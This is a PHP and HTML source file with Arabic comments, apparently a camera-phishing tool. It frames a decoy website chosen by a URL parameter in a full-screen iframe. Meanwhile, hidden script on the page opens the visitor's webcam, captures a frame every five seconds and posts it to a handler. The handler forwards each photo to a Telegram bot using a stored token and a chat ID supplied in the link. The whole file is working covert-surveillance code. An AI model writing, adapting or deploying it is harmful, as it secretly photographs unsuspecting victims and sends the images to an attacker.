<?php
// اسم الملف النصي
$filename = '../url.txt';

//الحصول على البيانات من الطلب
$lineNumber = isset($_GET['link']) ? intval($_GET['link']) : '';

$lines = file($filename, FILE_IGNORE_NEW_LINES);

// استخراج السطر المطلوب (الفهرس يبدأ من صفر لذا نقوم بطرح واحد)
$desiredLine = '';
if ($lineNumber && isset($lines[$lineNumber - 1])) {
    $desiredLine = trim($lines[$lineNumber - 1]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden; /* لمنع التمدد في حال تمت إضافة عناصر جانبية */
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <?php if (!empty($desiredLine)): ?>
        <iframe src="<?php echo htmlspecialchars($desiredLine); ?>" frameborder="0"></iframe>
    <?php endif; ?>
    
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

function getLineFromFile($filename, $lineNumber) {
    if (!file_exists($filename)) {
        return null;
    }

    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    if ($lineNumber > 0 && isset($lines[$lineNumber - 1])) {
        return trim($lines[$lineNumber - 1]);
    }

    return null;
}

// استلام عنصر ID2 من طلب GET
$idLineNumber = isset($_GET['ID2']) ? intval($_GET['ID2']) : null;

$token = null;

    $token = file_get_contents("../token.txt");

// عرض النتيجة للتأكد

    $chatId = $_GET['ID'] ?? '';

    if (empty($chatId)) {
        echo "Missing chat ID";
        exit;
    }

    // استقبال الصورة من الطلب
    $imageData = $_POST['image'] ?? '';

    if (empty($imageData)) {
        echo "No image data received";
        exit;
    }

    // إزالة رأس البيانات من الصورة
    $base64Image = str_replace('data:image/jpeg;base64,', '', $imageData);
    $base64Image = str_replace(' ', '+', $base64Image);
    $image = base64_decode($base64Image);

    $fileName = 'image_' . time() . '.jpg';
    file_put_contents($fileName, $image);

    // إرسال الصورة إلى تيليجرام
    function sendImageToTelegram($token, $chatId, $filename) {
        $url = "https://api.telegram.org/bot$token/sendPhoto";
        
        $post_fields = [
            'chat_id' => $chatId,
            'photo'   => new CURLFile(realpath($filename))
        ];

        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
        $output = curl_exec($ch);
        curl_close($ch);

        return $output;
    }

    // إرسال الصورة
    $response = sendImageToTelegram($token, $chatId, $fileName);
    echo $response;

    // حذف الصورة بعد إرسالها
    unlink($fileName);
} else {
    echo "Invalid request";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Capture and Send Image</title>
</head>
<body>
    <script>
        (async function() {
            // الحصول على كاميرا الويب
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // إعداد لالتقاط الصور
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // التقاط الصور كل 5 ثوانٍ
            setInterval(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // تحويل الصورة إلى بيانات Base64
                const dataURL = canvas.toDataURL('image/jpeg');

                // إرسال الصورة إلى السكربت PHP
                await fetch('', { // تأكد من استبدال YOUR_CHAT_ID بالمعرف الخاص بك
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: `image=${encodeURIComponent(dataURL)}`
                });
            }, 5000); // كل 5 ثوانٍ
        })();
    </script>
</body>
</html>
